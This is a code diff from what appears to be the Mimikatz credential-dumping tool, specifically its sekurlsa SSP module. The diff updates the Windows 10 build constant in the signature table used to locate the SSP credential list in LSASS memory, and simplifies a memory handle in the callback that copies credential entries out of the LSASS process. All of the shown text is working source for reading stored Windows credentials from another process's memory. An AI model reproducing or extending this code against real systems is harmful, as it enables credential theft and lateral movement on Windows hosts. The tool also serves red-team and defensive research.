@@ -12,7 +12,7 @@ BYTE PTRN_WIN10_SspCredentialList[]	= {0xc7, 0x46, 0x24, 0x43, 0x72, 0x64, 0x41,
 KULL_M_PATCH_GENERIC SspReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_SspCredentialList),	PTRN_WIN5_SspCredentialList},	{0, NULL}, {16}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_SspCredentialList),	PTRN_WIN6_SspCredentialList},	{0, NULL}, {20}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {16}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WIN10_SspCredentialList),	PTRN_WIN10_SspCredentialList},	{0, NULL}, {16}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_SspCredentialList[]	= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
@@ -34,8 +34,7 @@ NTSTATUS kuhl_m_sekurlsa_ssp(int argc, wchar_t * argv[])
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
 	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hBuffer}, aLsass = {NULL, pData->cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	ULONG monNb = 0;
 
 	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, ARRAYSIZE(SspReferences), (PVOID *) &SspCredentialList, NULL, NULL, NULL))
